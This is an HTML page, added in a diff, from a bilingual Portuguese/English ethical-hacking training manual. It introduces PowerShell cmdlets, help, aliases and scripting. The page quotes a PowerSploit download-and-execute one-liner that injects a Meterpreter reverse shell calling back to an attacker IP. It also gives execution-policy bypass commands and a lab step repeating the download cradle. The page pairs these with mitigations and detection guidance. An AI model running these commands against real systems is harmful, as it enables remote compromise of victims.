@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 0 — Introdução: PowerShell para Hackers | Ch. 0 — Introduction</title>
+<style>
+  :root{
+    --bg:#0d1117; --bg2:#161b22; --bg3:#1c2128; --fg:#c9d1d9; --fg2:#8b949e;
+    --accent:#39d353; --accent2:#58a6ff; --warn:#d29922; --danger:#f85149;
+    --border:#30363d; --code-bg:#0b0f14; --code-fg:#7ee787;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0; background:var(--bg); color:var(--fg);
+    font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.65; font-size:16px;
+  }
+  header{
+    background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);
+    border-bottom:2px solid var(--accent);
+    padding:2rem 1.5rem 1.5rem;
+  }
+  header h1{margin:0 0 .3rem; font-size:1.9rem; color:var(--accent)}
+  header .sub{color:var(--fg2); font-size:.95rem}
+  header .meta{margin-top:.8rem; font-size:.85rem; color:var(--fg2)}
+  header .meta span{margin-right:1.2rem}
+  nav.toc{
+    background:var(--bg2); border:1px solid var(--border); border-radius:8px;
+    padding:1rem 1.2rem; margin:1.5rem auto; max-width:1100px;
+  }
+  nav.toc h2{margin:0 0 .6rem; font-size:1rem; color:var(--accent2); text-transform:uppercase; letter-spacing:.05em}
+  nav.toc ol{margin:0; padding-left:1.3rem; columns:2; column-gap:2rem}
+  nav.toc a{color:var(--fg); text-decoration:none}
+  nav.toc a:hover{color:var(--accent)}
+  main{max-width:1100px; margin:0 auto; padding:0 1.5rem 3rem}
+  section{
+    background:var(--bg2); border:1px solid var(--border); border-radius:8px;
+    padding:1.4rem 1.6rem; margin:1.5rem 0;
+  }
+  section h2{
+    margin-top:0; color:var(--accent2); font-size:1.3rem;
+    border-bottom:1px solid var(--border); padding-bottom:.5rem;
+  }
+  section h3{color:var(--accent); font-size:1.05rem; margin-top:1.4rem}
+  .lang{display:block; margin:.4rem 0}
+  .lang .pt::before{content:"🇵🇹 PT "; color:var(--accent); font-weight:600; font-size:.8rem; letter-spacing:.05em}
+  .lang .en::before{content:"🇬🇧 EN "; color:var(--accent2); font-weight:600; font-size:.8rem; letter-spacing:.05em}
+  .lang .pt,.lang .en{display:block; margin:.25rem 0 .25rem 0}
+  pre{
+    background:var(--code-bg); border:1px solid var(--border); border-left:3px solid var(--accent);
+    border-radius:6px; padding:1rem 1.1rem; overflow-x:auto;
+    font-family:"Cascadia Code","Fira Code",Consolas,monospace; font-size:.9rem;
+    color:var(--code-fg); line-height:1.5;
+  }
+  code.inline{
+    background:var(--bg3); border:1px solid var(--border); border-radius:4px;
+    padding:.1rem .4rem; font-family:Consolas,monospace; font-size:.88rem; color:var(--accent);
+  }
+  table{width:100%; border-collapse:collapse; margin:1rem 0; font-size:.92rem}
+  th,td{border:1px solid var(--border); padding:.55rem .7rem; text-align:left; vertical-align:top}
+  th{background:var(--bg3); color:var(--accent2)}
+  tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+  .callout{
+    border-left:4px solid var(--warn); background:rgba(210,153,34,.08);
+    padding:.8rem 1rem; border-radius:0 6px 6px 0; margin:1rem 0;
+  }
+  .callout.danger{border-left-color:var(--danger); background:rgba(248,81,73,.08)}
+  .callout.info{border-left-color:var(--accent2); background:rgba(88,166,255,.08)}
+  .callout.complement{border-left-color:var(--accent); background:rgba(57,211,83,.06)}
+  .callout strong{color:var(--fg)}
+  .badge{
+    display:inline-block; font-size:.7rem; font-weight:700; letter-spacing:.05em;
+    padding:.15rem .5rem; border-radius:999px; margin-left:.4rem; vertical-align:middle;
+  }
+  .badge.orig{background:rgba(88,166,255,.15); color:var(--accent2); border:1px solid var(--accent2)}
+  .badge.comp{background:rgba(57,211,83,.12); color:var(--accent); border:1px solid var(--accent)}
+  .badge.part{background:rgba(210,153,34,.15); color:var(--warn); border:1px solid var(--warn)}
+  ul.checklist{list-style:none; padding-left:0}
+  ul.checklist li::before{content:"☐ "; color:var(--accent); font-weight:700; margin-right:.3rem}
+  footer{
+    border-top:1px solid var(--border); margin-top:3rem; padding:1.5rem;
+    text-align:center; color:var(--fg2); font-size:.85rem;
+  }
+  footer a{color:var(--accent2); text-decoration:none}
+  footer a:hover{color:var(--accent)}
+  @media (max-width:720px){ nav.toc ol{columns:1} header h1{font-size:1.4rem} }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Cap. 0 — Introdução: PowerShell para Hackers</h1>
+  <div class="sub">Ch. 0 — Introduction: PowerShell for Hackers</div>
+  <div class="meta">
+    <span>📖 Manual de Formação Ethical Hacker</span>
+    <span>🎯 Nível: Iniciante / Beginner</span>
+  </div>
+</header>
+
+<nav class="toc">
+  <h2>Índice / Table of Contents</h2>
+  <ol>
+    <li><a href="#obj">Objetivos / Objectives</a></li>
+    <li><a href="#ctx">Contexto / Context</a></li>
+    <li><a href="#cmdlets">Cmdlets</a></li>
+    <li><a href="#scripts">Scripts + Explicação / Scripts + Explanation</a></li>
+    <li><a href="#mitre">MITRE ATT&amp;CK</a></li>
+    <li><a href="#mitig">Mitigações / Mitigations</a></li>
+    <li><a href="#lab">Laboratório / Lab</a></li>
+    <li><a href="#rev">Revisão / Review</a></li>
+    <li><a href="#sum">Resumo / Summary</a></li>
+  </ol>
+</nav>
+
+<main>
+
+<!-- ===================== OBJETIVOS ===================== -->
+<section id="obj">
+  <h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+  <div class="lang">
+    <span class="pt">Compreender o contexto histórico do PowerShell (cmd.exe → MONAD → PowerShell 2.0); distinguir cmdlets (verb-noun) de comandos BASH; utilizar o sistema de ajuda; reconhecer aliases Linux; abrir e usar o PowerShell ISE; criar, gravar e executar o primeiro script <code class="inline">.ps1</code>.</span>
+    <span class="en">Understand PowerShell's historical context (cmd.exe → MONAD → PowerShell 2.0); distinguish cmdlets (verb-noun) from BASH commands; use the help system; recognize Linux aliases; open and use PowerShell ISE; create, save, and run the first <code class="inline">.ps1</code> script.</span>
+  </div>
+</section>
+
+<!-- ===================== CONTEXTO ===================== -->
+<section id="ctx">
+  <h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+  <div class="lang">
+    <span class="pt">Um hacker profissional precisa de dominar Linux (90%+ das ferramentas nascem lá, maior granularidade de controlo, código aberto). Mas a Microsoft reconheceu as limitações do <code class="inline">cmd.exe</code> desde os anos 90 e respondeu com o PowerShell. O resultado é que <strong>o Windows se torna uma plataforma de ataque mais poderosa</strong> — e o PowerShell no sistema alvo é, ele próprio, um vetor de ataque. O artigo cita o PowerSploit e o Metasploit Web Delivery como exemplos de abuso do PowerShell na vítima.</span>
+    <span class="en">A professional hacker must master Linux (90%+ of tools originate there, finer control, open source). But Microsoft recognized <code class="inline">cmd.exe</code> limitations since the 90s and responded with PowerShell. The result: <strong>Windows becomes a more powerful attack platform</strong> — and PowerShell on the target is itself an attack vector. The article cites PowerSploit and Metasploit Web Delivery as examples of abusing PowerShell on the victim.</span>
+  </div>
+
+  <h3>Timeline histórica / Historical timeline</h3>
+  <table>
+    <tr><th>Ano / Year</th><th>Marco / Milestone</th></tr>
+    <tr><td>1990s</td><td>Microsoft reconhece limitações do <code class="inline">cmd.exe</code> / acknowledges <code class="inline">cmd.exe</code> limits</td></tr>
+    <tr><td>2002</td><td>Whitepaper do <strong>MONAD</strong> (Microsoft Shell)</td></tr>
+    <tr><td>2007</td><td><strong>Windows PowerShell</strong> lançado como add-on / released as add-on</td></tr>
+    <tr><td>2008+</td><td><strong>PowerShell 2.0</strong> integrado no Windows 7 / Server 2008 e seguintes / integrated into Windows 7 / Server 2008 and later</td></tr>
+  </table>
+</section>
+
+<!-- ===================== CMDLETS ===================== -->
+<section id="cmdlets">
+  <h2>3. Cmdlets — O Coração do PowerShell / PowerShell's Core <span class="badge orig">Original</span></h2>
+  <div class="lang">
+    <span class="pt">A diferença fundamental face ao BASH: a Microsoft criou <strong>cmdlets</strong> (<em>command-lets</em>) — comandos únicos que executam tarefas por vezes complexas, semelhantes a funções. A forma é sempre <strong>verbo-substantivo</strong>.</span>
+    <span class="en">The fundamental difference from BASH: Microsoft created <strong>cmdlets</strong> (<em>command-lets</em>) — single commands that perform sometimes complex tasks, similar to functions. The form is always <strong>verb-noun</strong>.</span>
+  </div>
+<pre>Get-Help          # verbo Get + substantivo Help
+Write-Output      # verbo Write + substantivo Output
+Get-ChildItem     # verbo Get + substantivo ChildItem (equivale a ls/dir)</pre>
+  <div class="callout info">
+    <strong>Nota do formador / Trainer's note:</strong>
+    <div class="lang">
+      <span class="pt">O autor observa que os cmdlets podem parecer "clunky" face aos aliases Linux — <code class="inline">Get-ChildItem</code> em vez de <code class="inline">ls</code>. Por isso, ele próprio usa <code class="inline">ls</code>. Os aliases existem precisamente para facilitar a transição de administradores Linux.</span>
+      <span class="en">The author notes cmdlets can feel "clunky" next to Linux aliases — <code class="inline">Get-ChildItem</code> instead of <code class="inline">ls</code>. That's why he uses <code class="inline">ls</code> himself. Aliases exist precisely to ease the transition for Linux admins.</span>
+    </div>
+  </div>
+</section>
+
+<!-- ===================== SCRIPTS ===================== -->
+<section id="scripts">
+  <h2>4. Scripts Extraídos e Explicação / Extracted Scripts and Explanation</h2>
+
+  <h3>4.1 Passo 1 — Abrir o PowerShell / Step 1 — Open PowerShell <span class="badge orig">Original</span></h3>
+  <div class="lang">
+    <span class="pt">Escrever <code class="inline">powershell</code> na barra de pesquisa do menu Iniciar e clicar em "PowerShell".</span>
+    <span class="en">Type <code class="inline">powershell</code> in the Start menu search bar and click "PowerShell".</span>
+  </div>
+
+  <h3>4.2 Passo 2 — Obter Ajuda / Step 2 — Get Help <span class="badge orig">Original</span></h3>
+<pre>get-help</pre>
+  <div class="lang">
+    <span class="pt"><code class="inline">Get-Help</code> é o cmdlet de ajuda. Sem argumentos, mostra o ecrã de ajuda geral. A Microsoft criou aliases: <code class="inline">help</code> e <code class="inline">man</code> produzem o mesmo resultado.</span>
+    <span class="en"><code class="inline">Get-Help</code> is the help cmdlet. With no arguments, it shows the general help screen. Microsoft created aliases: <code class="inline">help</code> and <code class="inline">man</code> produce the same result.</span>
+  </div>
+
+  <h3>4.3 Passo 3 — Ajuda Contextual / Step 3 — Context-Sensitive Help <span class="badge orig">Original</span></h3>
+<pre>get-help Write-Output</pre>
+  <div class="lang">
+    <span class="pt">Tal como <code class="inline">man &lt;comando&gt;</code> em Linux, <code class="inline">get-help &lt;cmdlet&gt;</code> mostra a página de manual do cmdlet — sintaxe, parâmetros, exemplos. <code class="inline">help</code> e <code class="inline">man</code> funcionam igual.</span>
+    <span class="en">Just like <code class="inline">man &lt;command&gt;</code> on Linux, <code class="inline">get-help &lt;cmdlet&gt;</code> shows the cmdlet's manual page — syntax, parameters, examples. <code class="inline">help</code> and <code class="inline">man</code> work the same.</span>
+  </div>
+<pre>help Write-Output                 # alias de get-help
+man Write-Output                  # alias Linux-style
+get-help Write-Output -Examples   # só exemplos / examples only
+get-help Write-Output -Full       # documentação completa / full docs</pre>
+
+  <h3>4.4 Passo 4 — Comandos Linux com Alias / Step 4 — Linux Commands with Aliases <span class="badge orig">Original</span> <span class="badge comp">Complementar / Complementary</span></h3>
+  <div class="lang">
+    <span class="pt">A Microsoft criou aliases para os comandos Linux mais comuns, para encorajar a adoção por administradores Linux. O artigo lista: <code class="inline">grep</code>, <code class="inline">cat</code>, <code class="inline">ps</code>, <code class="inline">mv</code>, <code class="inline">rm</code>, <code class="inline">echo</code>, <code class="inline">pwd</code>, <code class="inline">kill</code>, <code class="inline">export</code>, <code class="inline">cp</code>. A tabela abaixo foi <strong>completada pela nossa autoria</strong> com o cmdlet correspondente e a função de cada um.</span>
+    <span class="en">Microsoft created aliases for the most common Linux commands, to encourage adoption by Linux admins. The article lists: <code class="inline">grep</code>, <code class="inline">cat</code>, <code class="inline">ps</code>, <code class="inline">mv</code>, <code class="inline">rm</code>, <code class="inline">echo</code>, <code class="inline">pwd</code>, <code class="inline">kill</code>, <code class="inline">export</code>, <code class="inline">cp</code>. The table below was <strong>completed by our authorship</strong> with the corresponding cmdlet and function.</span>
+  </div>
+  <table>
+    <tr><th>Linux / cmd.exe</th><th>Cmdlet PowerShell</th><th>Função / Function</th></tr>
+    <tr><td><code class="inline">ls</code> / <code class="inline">dir</code></td><td><code class="inline">Get-ChildItem</code></td><td>Listar ficheiros / List files</td></tr>
+    <tr><td><code class="inline">cat</code> / <code class="inline">type</code></td><td><code class="inline">Get-Content</code></td><td>Ler ficheiro / Read file</td></tr>
+    <tr><td><code class="inline">grep</code> / <code class="inline">findstr</code></td><td><code class="inline">Select-String</code></td><td>Procurar texto / Search text</td></tr>
+    <tr><td><code class="inline">ps</code> / <code class="inline">tasklist</code></td><td><code class="inline">Get-Process</code></td><td>Listar processos / List processes</td></tr>
+    <tr><td><code class="inline">mv</code> / <code class="inline">move</code></td><td><code class="inline">Move-Item</code></td><td>Mover / Move</td></tr>
+    <tr><td><code class="inline">rm</code> / <code class="inline">del</code></td><td><code class="inline">Remove-Item</code></td><td>Apagar / Delete</td></tr>
+    <tr><td><code class="inline">cp</code> / <code class="inline">copy</code></td><td><code class="inline">Copy-Item</code></td><td>Copiar / Copy</td></tr>
+    <tr><td><code class="inline">echo</code></td><td><code class="inline">Write-Output</code></td><td>Escrever / Write</td></tr>
+    <tr><td><code class="inline">pwd</code> / <code class="inline">cd</code></td><td><code class="inline">Get-Location</code></td><td>Diretório atual / Current dir</td></tr>
+    <tr><td><code class="inline">kill</code> / <code class="inline">taskkill</code></td><td><code class="inline">Stop-Process</code></td><td>Terminar processo / Kill process</td></tr>
+    <tr><td><code class="inline">export</code> / <code class="inline">set</code></td><td><code class="inline">Set-Item</code> (env)</td><td>Variável de ambiente / Env var</td></tr>
+    <tr><td><code class="inline">man</code> / <code class="inline">help</code></td><td><code class="inline">Get-Help</code></td><td>Ajuda / Help</td></tr>
+  </table>
+<pre>ls                    # alias de Get-ChildItem
+cat example.txt       # alias de Get-Content
+ps                    # alias de Get-Process
+pwd                   # alias de Get-Location
+echo "teste"          # alias de Write-Output</pre>
+
+  <h3>4.5 Passo 5 — PowerShell ISE / Step 5 — PowerShell ISE <span class="badge orig">Original</span></h3>
+  <div class="lang">
+    <span class="pt">Para criar scripts, pode usar-se Notepad, Notepad++ ou o <strong>ISE</strong> (Integrated Scripting Environment), incluído no PowerShell. Abre-se escrevendo <code class="inline">powershell</code> na pesquisa e escolhendo "PowerShell ISE".</span>
+    <span class="en">To create scripts, you can use Notepad, Notepad++ or the <strong>ISE</strong> (Integrated Scripting Environment), bundled with PowerShell. Open it by typing <code class="inline">powershell</code> in search and choosing "PowerShell ISE".</span>
+  </div>
+  <div class="callout">
+    <strong>Nota / Note:</strong>
+    <div class="lang">
+      <span class="pt">O ISE está <strong>depreciado</strong> em PowerShell 7+ (usa-se VS Code com extensão PowerShell). Mas para Windows PowerShell 5.1 (o que vem no Windows), continua funcional e é o que o artigo usa.</span>
+      <span class="en">ISE is <strong>deprecated</strong> in PowerShell 7+ (use VS Code with PowerShell extension). But for Windows PowerShell 5.1 (bundled in Windows), it still works and is what the article uses.</span>
+    </div>
+  </div>
+
+  <h3>4.6 Passo 6 — "Hello Hackers-Arise!" <span class="badge orig">Original</span></h3>
+<pre>Write-Output "Hello Hackers-Arise!"</pre>
+  <div class="lang">
+    <span class="pt">As aspas duplas indicam que o conteúdo é uma <strong>string literal</strong> (texto humano, não comando). <code class="inline">Write-Output</code> envia a string para o pipeline/saída padrão. No ISE, clicar no <strong>botão verde</strong> executa; gravar com <strong>File → Save</strong> com extensão <code class="inline">.ps1</code>.</span>
+    <span class="en">Double quotes indicate the content is a <strong>string literal</strong> (human text, not a command). <code class="inline">Write-Output</code> sends the string to the pipeline/standard output. In ISE, click the <strong>green button</strong> to run; save with <strong>File → Save</strong> using the <code class="inline">.ps1</code> extension.</span>
+  </div>
+<pre>.\Hello Hackers-Arise.ps1</pre>
+  <div class="callout">
+    <strong>Se a execution policy bloquear / If execution policy blocks it:</strong>
+    <div class="lang">
+      <span class="pt">Usar <code class="inline">powershell -ep bypass</code> (ver Cap. 1) ou <code class="inline">Set-ExecutionPolicy -Scope Process Bypass</code>.</span>
+      <span class="en">Use <code class="inline">powershell -ep bypass</code> (see Ch. 1) or <code class="inline">Set-ExecutionPolicy -Scope Process Bypass</code>.</span>
+    </div>
+  </div>
+
+  <h3>4.7 Exemplo Ofensivo Citado — PowerSploit <span class="badge orig">Original</span></h3>
+<pre>IEX(New-Object Net.WebClient).DownloadString("http://192.168.181.128:8000/CodeExecution/Invoke-Shellcode.ps1")
+Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost 192.168.181.128 -lport 4444 -Force</pre>
+  <div class="lang">
+    <span class="pt"><strong>Linha 1:</strong> <code class="inline">New-Object Net.WebClient</code> cria um cliente HTTP .NET; <code class="inline">.DownloadString(...)</code> descarrega o script <code class="inline">Invoke-Shellcode.ps1</code> de um servidor HTTP controlado pelo atacante; <code class="inline">IEX(...)</code> = <code class="inline">Invoke-Expression</code>, que <strong>executa o conteúdo em memória</strong> — sem tocar no disco. É a técnica <em>fileless</em> clássica.</span>
+    <span class="en"><strong>Line 1:</strong> <code class="inline">New-Object Net.WebClient</code> creates a .NET HTTP client; <code class="inline">.DownloadString(...)</code> downloads <code class="inline">Invoke-Shellcode.ps1</code> from an attacker-controlled HTTP server; <code class="inline">IEX(...)</code> = <code class="inline">Invoke-Expression</code>, which <strong>executes the content in memory</strong> — never touching disk. Classic <em>fileless</em> technique.</span>
+  </div>
+  <div class="lang">
+    <span class="pt"><strong>Linha 2:</strong> <code class="inline">Invoke-Shellcode</code> injeta o payload Meterpreter (<code class="inline">windows/meterpreter/reverse_http</code>) no processo atual, ligando de volta ao <code class="inline">lhost:lport</code> (<code class="inline">192.168.181.128:4444</code>). <code class="inline">-Force</code> confirma a execução sem prompt.</span>
+    <span class="en"><strong>Line 2:</strong> <code class="inline">Invoke-Shellcode</code> injects the Meterpreter payload (<code class="inline">windows/meterpreter/reverse_http</code>) into the current process, connecting back to <code class="inline">lhost:lport</code> (<code class="inline">192.168.181.128:4444</code>). <code class="inline">-Force</code> confirms execution without a prompt.</span>
+  </div>
+  <div class="callout info">
+    <strong>Contexto / Context:</strong>
+    <div class="lang">
+      <span class="pt">O atacante aloja <code class="inline">Invoke-Shellcode.ps1</code> via <code class="inline">python3 -m http.server 8000</code> e tem um listener Metasploit (<code class="inline">msfconsole</code> → <code class="inline">exploit/multi/handler</code>).</span>
+      <span class="en">The attacker hosts <code class="inline">Invoke-Shellcode.ps1</code> via <code class="inline">python3 -m http.server 8000</code> and runs a Metasploit listener (<code class="inline">msfconsole</code> → <code class="inline">exploit/multi/handler</code>).</span>
+    </div>
+  </div>
+</section>
+
+<!-- ===================== MITRE ===================== -->
+<section id="mitre">
+  <h2>5. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar / Complementary</span></h2>
+  <table>
+    <tr><th>Técnica / Technique</th><th>ID</th><th>Onde aparece / Where it appears</th></tr>
+    <tr><td>Command and Scripting Interpreter: PowerShell</td><td>T1059.001</td><td>Todo o capítulo / Whole chapter</td></tr>
+    <tr><td>System Information Discovery</td><td>T1082</td><td><code class="inline">ps</code>, <code class="inline">pwd</code>, <code class="inline">ls</code></td></tr>
+    <tr><td>File and Directory Discovery</td><td>T1083</td><td><code class="inline">ls</code>, <code class="inline">cat</code></td></tr>
+    <tr><td>Ingress Tool Transfer</td><td>T1105</td><td><code class="inline">DownloadString</code> (PowerSploit)</td></tr>
+    <tr><td>Process Injection</td><td>T1055</td><td><code class="inline">Invoke-Shellcode</code></td></tr>
+    <tr><td>Obfuscated Files or Information</td><td>T1027</td><td><code class="inline">IEX</code> + download remoto</td></tr>
+    <tr><td>Application Layer Protocol: Web</td><td>T1071.001</td><td><code class="inline">reverse_http</code></td></tr>
+  </table>
+</section>
+
+<!-- ===================== MITIGAÇÕES ===================== -->
+<section id="mitig">
+  <h2>6. Mitigações Blue Team / Blue Team Mitigations <span class="badge comp">Complementar / Complementary</span></h2>
+  <ol>
+    <li><strong>PowerShell Script Block Logging</strong> (Event ID 4104) — regista o código executado, mesmo ofuscado. / logs executed code, even obfuscated.</li>
+    <li><strong>Module Logging</strong> (Event ID 4103) — regista pipelines e parâmetros. / logs pipelines and parameters.</li>
+    <li><strong>Transcription</strong> — grava toda a sessão PowerShell em ficheiro. / records the entire PowerShell session to file.</li>
+    <li><strong>AMSI</strong> ativo — deteta <code class="inline">IEX</code> + <code class="inline">DownloadString</code> em tempo real. / detects <code class="inline">IEX</code> + <code class="inline">DownloadString</code> in real time.</li>
+    <li><strong>Constrained Language Mode</strong> — bloqueia <code class="inline">New-Object</code>, <code class="inline">Add-Type</code>, chamadas .NET arbitrárias. / blocks <code class="inline">New-Object</code>, <code class="inline">Add-Type</code>, arbitrary .NET calls.</li>
+    <li><strong>AppLocker/WDAC</strong> — restringe execução de <code class="inline">.ps1</code> a caminhos assinados. / restricts <code class="inline">.ps1</code> execution to signed paths.</li>
+    <li><strong>Bloquear <code class="inline">powershell.exe</code></strong> para utilizadores que não precisam — via GPO/AppLocker. / Block <code class="inline">powershell.exe</code> for users who don't need it — via GPO/AppLocker.</li>
+    <li><strong>Monitorizar</strong> evento 4104 com strings como <code class="inline">IEX</code>, <code class="inline">DownloadString</code>, <code class="inline">Invoke-Shellcode</code>, <code class="inline">FromBase64String</code>. / Monitor event 4104 for these strings.</li>
+    <li><strong>Desativar PowerShell 2.0</strong> — evita downgrade attacks. / Disable PowerShell 2.0 — prevents downgrade attacks.
+<pre>Disable-WindowsOptionalFeature -FeatureName MicrosoftWindowsPowerShellV2 -Online</pre></li>
+    <li><strong>Egress filtering</strong> — bloquear HTTP de saída para IPs não allowlisted. / block outbound HTTP to non-allowlisted IPs.</li>
+  </ol>
+</section>
+
+<!-- ===================== LAB ===================== -->
+<section id="lab">
+  <h2>7. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar / Complementary</span></h2>
+  <div class="lang">
+    <span class="pt"><strong>Cenário:</strong> VM Windows 10/11 isolada (host-only network, sem Internet). Snapshot antes de começar.</span>
+    <span class="en"><strong>Scenario:</strong> Isolated Windows 10/11 VM (host-only network, no Internet). Snapshot before starting.</span>
+  </div>
+  <table>
+    <tr><th>#</th><th>Tarefa / Task</th><th>Comando / Command</th><th>Evidência / Evidence</th></tr>
+    <tr><td>1</td><td>Ver versão / Check version</td><td><code class="inline">$PSVersionTable</code></td><td>Versão, edição / Version, edition</td></tr>
+    <tr><td>2</td><td>Ajuda geral / General help</td><td><code class="inline">get-help</code></td><td>Screenshot</td></tr>
+    <tr><td>3</td><td>Ajuda contextual / Context help</td><td><code class="inline">get-help Write-Output</code></td><td>Sintaxe, parâmetros / Syntax, parameters</td></tr>
+    <tr><td>4</td><td>Testar 5 aliases / Test 5 aliases</td><td><code class="inline">ls</code>, <code class="inline">cat</code>, <code class="inline">ps</code>, <code class="inline">pwd</code>, <code class="inline">echo "x"</code></td><td>Output de cada / Output of each</td></tr>
+    <tr><td>5</td><td>Criar Hello no ISE / Create Hello in ISE</td><td><code class="inline">Write-Output "Hello Hackers-Arise!"</code></td><td>Ficheiro <code class="inline">.ps1</code> + output</td></tr>
+    <tr><td>6</td><td>Executar / Run</td><td><code class="inline">.\hello.ps1</code></td><td>Output</td></tr>
+    <tr><td>7</td><td>(Opcional) Testar <code class="inline">IEX</code> com Kali / (Optional) test <code class="inline">IEX</code> with Kali</td><td><code class="inline">python3 -m http.server 8000</code> + <code class="inline">IEX(...DownloadString("http://KALI_IP:8000/test.ps1"))</code></td><td>PCAP (Wireshark) + output</td></tr>
+    <tr><td>8</td><td>(Defensivo) Ativar Script Block Logging e repetir 7 / (Defensive) enable logging and repeat 7</td><td>Ver GPO abaixo / See GPO below</td><td>Evento 4104 / Event 4104</td></tr>
+  </table>
+
+  <h3>Ativar Script Block Logging / Enable Script Block Logging</h3>
+  <div class="lang">
+    <span class="pt">Via GPO: <code class="inline">Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging → Enabled</code>. Ou via registo:</span>
+    <span class="en">Via GPO: <code class="inline">Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging → Enabled</code>. Or via registry:</span>
+  </div>
+<pre>reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f</pre>
+<pre>Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 20 |
+  Where-Object Id -eq 4104 | Format-List TimeCreated, Message</pre>
+
+  <h3>Checklist de evidências / Evidence checklist</h3>
+  <ul class="checklist">
+    <li>Snapshot inicial / Initial snapshot</li>
+    <li>Output de <code class="inline">$PSVersionTable</code></li>
+    <li>Screenshots de <code class="inline">get-help</code> e <code class="inline">get-help Write-Output</code></li>
+    <li>Output dos 5 aliases / 5 aliases output</li>
+    <li>Ficheiro <code class="inline">hello.ps1</code> + output</li>
+    <li>(Opcional) PCAP do download <code class="inline">IEX</code> / <code class="inline">IEX</code> download PCAP</li>
+    <li>(Defensivo) Evento 4104 capturado / Event 4104 captured</li>
+    <li>Snapshot final / Final snapshot</li>
+  </ul>
+</section>
+
+<!-- ===================== REVISÃO ===================== -->
+<section id="rev">
+  <h2>8. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar / Complementary</span></h2>
+  <ol>
+    <li>Qual foi o nome de código do predecessor do PowerShell e em que ano surgiu o whitepaper? / What was the codename of PowerShell's predecessor and in what year did the whitepaper appear?</li>
+    <li>O que distingue um cmdlet de um comando BASH? Dá três exemplos verb-noun. / What distinguishes a cmdlet from a BASH command? Give three verb-noun examples.</li>
+    <li>Que aliases Linux existem para <code class="inline">Get-ChildItem</code>, <code class="inline">Get-Content</code> e <code class="inline">Get-Process</code>? / Which Linux aliases exist for these cmdlets?</li>
+    <li>Porque é que <code class="inline">IEX(New-Object Net.WebClient).DownloadString(...)</code> é considerado <em>fileless</em>? / Why is it considered <em>fileless</em>?</li>
+    <li>Que evento Windows regista o código executado por PowerShell e como se ativa? / Which Windows event logs PowerShell-executed code and how is it enabled?</li>
+    <li>Porque é recomendável desativar o PowerShell 2.0? / Why is disabling PowerShell 2.0 recommended?</li>
+  </ol>
+</section>
+
+<!-- ===================== RESUMO ===================== -->
+<section id="sum">
+  <h2>9. Resumo do Capítulo / Chapter Summary</h2>
+  <div class="lang">
+    <span class="pt">Este capítulo estabeleceu as fundações conceptuais: a história do PowerShell, o modelo de cmdlets verb-noun, o sistema de ajuda, os aliases Linux, o ISE e o primeiro script. Mostrou também, com o exemplo PowerSploit, que o PowerShell é simultaneamente <strong>ferramenta de administração e vetor de ataque</strong> — a dualidade que percorre todo o manual. O Cap. 1 (The Basics) entrará na prática ofensiva: credential harvesting, persistência, backdoors.</span>
+    <span class="en">This chapter laid the conceptual foundations: PowerShell history, the verb-noun cmdlet model, the help system, Linux aliases, ISE, and the first script. It also showed, via the PowerSploit example, that PowerShell is simultaneously <strong>an admin tool and an attack vector</strong> — the duality that runs through the whole manual. Ch. 1 (The Basics) will dive into offensive practice: credential harvesting, persistence, backdoors.</span>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div>Manual de Formação Ethical Hacker — Cap. 0 / Ethical Hacker Training Manual — Ch. 0</div>
+  <div style="margin-top:.6rem">
+    <a href="#">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+    <a href="#">Índice / Index</a> &nbsp;|&nbsp;
+    <a href="cap01.html">Cap. seguinte / Next →</a>
+  </div>
+</footer>
+
+</body>
+</html>
